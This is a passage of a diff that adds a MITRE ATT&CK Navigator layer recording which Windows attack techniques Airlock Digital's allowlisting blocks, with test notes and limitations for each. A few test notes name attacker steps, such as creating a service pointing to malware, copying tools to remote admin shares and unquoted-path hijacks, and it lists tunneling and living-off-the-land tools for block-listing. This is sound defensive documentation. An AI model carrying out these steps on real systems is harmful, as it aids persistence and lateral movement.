+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1568.002",
+      "score": 0,
+      "comment": "DGA. Network/in-process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1568.003",
+      "score": 0,
+      "comment": "DNS calculation. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1569",
+      "score": 1,
+      "comment": "Service binary must be trusted. Service creation may succeed but untrusted binary blocked at start. sc.exe cannot be practically blocklisted but the binary execution is the control point. | Test: sc create evilsvc binPath= C:\\Temp\\malware.exe -> OK. sc start -> binary blocked. | Limitations: Service creation not prevented. sc.exe cannot be practically blocklisted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1569.002",
+      "score": 1,
+      "comment": "PsExec creates PSEXESVC.exe on target. Must be trusted. PsExec in Microsoft Recommended Block Rules predefined blocklist. Blocklist overrides allowlist. | Test: 1) PsExec to target -> PSEXESVC.exe blocked. 2) Import MS Block Rules -> PsExec blocked even with MS trust. | Limitations: If PSEXESVC explicitly allowlisted, it runs.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1570",
+      "score": 1,
+      "comment": "Lateral tool transfer \u2014 file copy to remote host succeeds (Airlock doesn't prevent file writes). But execution of transferred tool on target is blocked if untrusted. | Test: Copy malware to \\\\target\\C$\\Temp -> succeeds. Attempt to run on target -> blocked. | Limitations: File transfer not prevented. Execution is the control point.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1571",
+      "score": 0,
+      "comment": "Non-standard port. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1572",
+      "score": 1,
+      "comment": "Tunneling tools (chisel, plink, ngrok, cloudflared) must be trusted to execute. Blocked by default-deny. | Test: chisel.exe, plink.exe, ngrok.exe not allowlisted -> blocked. | Limitations: Built-in SSH tunneling (ssh.exe) on modern Windows available if not blocklisted.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1573",
+      "score": 0,
+      "comment": "Encrypted channel. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1573.001",
+      "score": 0,
+      "comment": "Symmetric crypto. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1573.002",
+      "score": 0,
+      "comment": "Asymmetric crypto. Network.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1574",
+      "score": 1,
+      "comment": "Hijack execution flow \u2014 DLL control is the primary defense. Untrusted DLLs blocked at load regardless of the hijack vector (search order, sideloading, COR_PROFILER, etc). | Test: Place untrusted DLL in trusted app directory -> DLL blocked at load. | Limitations: Memory-only hijacks (T1574.013 KernelCallbackTable) operate inside trusted process memory \u2014 not caught. Trusted-signed DLLs pass publisher trust.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.001",
+      "score": 1,
+      "comment": "DLL search order hijacking. Malicious DLL in app directory. Must be trusted. | Test: Unsigned DLL with legitimate name in app dir -> blocked. | Limitations: Strongest control against common malware technique.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.005",
+      "score": 1,
+      "comment": "Executable installer file perms weakness. Replacement must be trusted. | Test: Replace installer exe with unsigned -> blocked on service restart. | Limitations: File replacement itself is OS permissions issue.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.007",
+      "score": 1,
+      "comment": "Path interception by PATH env var. Malicious exe in high-priority PATH dir. Must be trusted. | Test: Unsigned exe named common_tool.exe in PATH dir -> blocked. | Limitations: If placed in path-trusted directory, may run.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.008",
+      "score": 1,
+      "comment": "Path interception by search order. Same principle as .007. | Test: Unsigned exe in directory searched before legitimate -> blocked. | Limitations: Path rule coverage important.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.009",
+      "score": 1,
+      "comment": "Unquoted path interception. Attacker places exe at shorter path. Must be trusted. | Test: Unquoted 'C:\\Program Files\\App\\svc.exe' -> place C:\\Program.exe (unsigned) -> blocked. | Limitations: Classic technique caught cleanly.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.010",
+      "score": 1,
+      "comment": "Services file perms weakness. Replace service binary. Must be trusted. | Test: Replace service binary with unsigned -> restart blocked. | Limitations: File replacement is OS perms issue.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.011",
+      "score": 1,
+      "comment": "Services registry perms weakness. Modify ImagePath to malicious exe. Must be trusted. | Test: Modify service ImagePath to unsigned exe -> start blocked. | Limitations: Reg mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.012",
+      "score": 1,
+      "comment": "COR_PROFILER .NET profiler DLL. Must be trusted. | Test: Set COR_PROFILER to untrusted DLL -> blocked when .NET app starts. | Limitations: Env var mod not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1574.013",
+      "score": 0,
+      "comment": "KernelCallbackTable. In-memory manipulation of trusted process. | Test: N/A - in-memory. EDR territory.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1574.014",
+      "score": 1,
+      "comment": "AppDomainManager injection. .NET config loads attacker DLL. Must be trusted. | Test: Malicious .config pointing to untrusted DLL -> blocked. | Limitations: Config file modification not prevented.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1606",
+      "score": 0,
+      "comment": "Forge web credentials. Token/cookie forgery. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1606.001",
+      "score": 0,
+      "comment": "Web cookies. Forgery. No file execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1606.002",
+      "score": 0,
+      "comment": "SAML tokens. Identity plane.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1611",
+      "score": 0,
+      "comment": "Escape to host from container. Container/VM escape. Not standard Windows endpoint scenario. | Limitations: Container security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1614",
+      "score": 0,
+      "comment": "System location discovery. Trusted tools/APIs.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1614.001",
+      "score": 0,
+      "comment": "System language discovery. Same.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1615",
+      "score": 1,
+      "comment": "gpresult.exe restrictable via blocklist metarule for non-admins. | Test: Blocklist gpresult.exe for non-admins.",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1620",
+      "score": 1,
+      "comment": "Reflective code loading relies on a loader process to invoke reflection (e.g., MSBuild, InstallUtil, RegAsm, PowerShell via Assembly.Load, custom .NET harnesses). Airlock blocks/blocklists the loader binaries. MSBuild, InstallUtil, RegAsm covered by predefined LOLBAS blocklist packages. PowerShell restrictable via metarule. Custom loader executables blocked by default-deny. The reflected assembly itself may never touch disk, but the process performing the reflection is controllable. | Test: 1) B",
+      "enabled": true,
+      "showSubtechniques": false,
+      "color": "#31a354"
+    },
+    {
+      "techniqueID": "T1621",
+      "score": 0,
+      "comment": "MFA request generation (MFA fatigue). Identity/social engineering.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1622",
+      "score": 0,
+      "comment": "Debugger evasion. If malware untrusted, blocked before check.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1649",
+      "score": 0,
+      "comment": "Steal/forge auth certificates. Certificate operations.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1652",
+      "score": 0,
+      "comment": "Device driver discovery. Trusted tools.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1653",
+      "score": 0,
+      "comment": "Power settings. Modifying power config to prevent sleep. No file execution. | Limitations: OS configuration, not execution.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1654",
+      "score": 0,
+      "comment": "Log enumeration. Reading logs. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1656",
+      "score": 0,
+      "comment": "Impersonation (social). Pretending to be someone. Social engineering.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1657",
+      "score": 0,
+      "comment": "Financial theft. Business logic/identity.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1659",
+      "score": 0,
+      "comment": "Content injection. Injecting content into network traffic. Network-level. | Limitations: If injected content leads to file download+execution, execution blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1665",
+      "score": 0,
+      "comment": "Hide infrastructure. Network/attacker infra.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1667",
+      "score": 0,
+      "comment": "Email bombing. Email-level.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1668",
+      "score": 0,
+      "comment": "Exclusive control. Mutex/lock to prevent other instances. Behavioral, inside trusted process.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1669",
+      "score": 0,
+      "comment": "Wi-Fi networks. Rogue Wi-Fi. Network-level. No file execution. | Limitations: Network security.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1672",
+      "score": 0,
+      "comment": "Email spoofing. Email-level technique.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1673",
+      "score": 0,
+      "comment": "Virtual machine discovery. Checking VM indicators. Behavioral.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1674",
+      "score": 0,
+      "comment": "Input injection (SendInput, keystrokes) is UI-level. Airlock doesn't monitor input. Resulting file launches checked. | Test: N/A - input simulation outside scope. | Limitations: Resulting binary execution still checked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1678",
+      "score": 0,
+      "comment": "Delay execution (sleep/timer). If malware is untrusted, blocked whenever it tries to execute regardless of delay. | Limitations: Delayed malware still blocked.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1679",
+      "score": 0,
+      "comment": "Selective exclusion. Malware selectively targeting systems. Behavioral.",
+      "enabled": true,
+      "showSubtechniques": false
+    },
+    {
+      "techniqueID": "T1680",
+      "score": 0,
+      "comment": "Local storage discovery. Enumerating storage. Data operation.",
+      "enabled": true,
+      "showSubtechniques": false
+    }
+  ],
+  "gradient": {
+    "colors": [
+      "#ffffff",
+      "#31a354"
+    ],
+    "minValue": 0,
+    "maxValue": 1
+  },
+  "legendItems": [
+    {
+      "label": "Covered (Yes) - 199",
+      "color": "#31a354"
+    },
+    {
+      "label": "Not Covered (No) - 273",
+      "color": "#ffffff"
+    }
+  ],
+  "showTacticRowBackground": true,
+  "tacticRowBackground": "#dddddd",
+  "selectTechniquesAcrossTactics": true,
+  "selectSubtechniquesWithParent": false,
+  "selectVisibleTechniques": false,
+  "metadata": [
+    {
+      "name": "organization",
+      "value": "Airlock Digital"
+    },
+    {
+      "name": "author",
+      "value": "Rob Shiplo"
+    },
+    {
+      "name": "platform",
+      "value": "Windows"
+    },
+    {
+      "name": "scoring",
+      "value": "Binary (Yes/No)"
+    },
+    {
+      "name": "attack_version",
+      "value": "18.1"
+    },
+    {
+      "name": "airlock_version",
+      "value": "6.1.x"
+    },
+    {
+      "name": "date",
+      "value": "March 2026"
+    }
+  ]
+}
